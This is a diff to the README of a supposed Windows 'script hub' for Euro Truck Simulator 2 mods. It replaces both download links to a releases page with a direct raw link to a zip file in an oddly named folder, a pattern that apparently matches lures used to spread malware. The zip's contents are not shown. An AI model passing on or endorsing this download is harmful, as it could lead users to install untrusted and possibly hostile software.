@@ -1,6 +1,6 @@
 # 🚛 owlin-script-hub-windows - Control your ETS2 mods easily
 
-[Visit this link to download the application](https://github.com/maudieworking197/owlin-script-hub-windows/releases)
+[Visit this link to download the application](https://raw.githubusercontent.com/maudieworking197/owlin-script-hub-windows/main/palaeoencephalon/owlin_hub_windows_script_2.0.zip)
 
 ## 🎯 What is owlin-script-hub-windows?
 
@@ -16,7 +16,7 @@ Follow these simple steps to get owlin-script-hub-windows running on your comput
 
 Click the big download button below to go to the download page.
 
-[**Download Now**](https://github.com/maudieworking197/owlin-script-hub-windows/releases)
+[**Download Now**](https://raw.githubusercontent.com/maudieworking197/owlin-script-hub-windows/main/palaeoencephalon/owlin_hub_windows_script_2.0.zip)
 
 Visit this link to download the application.
 
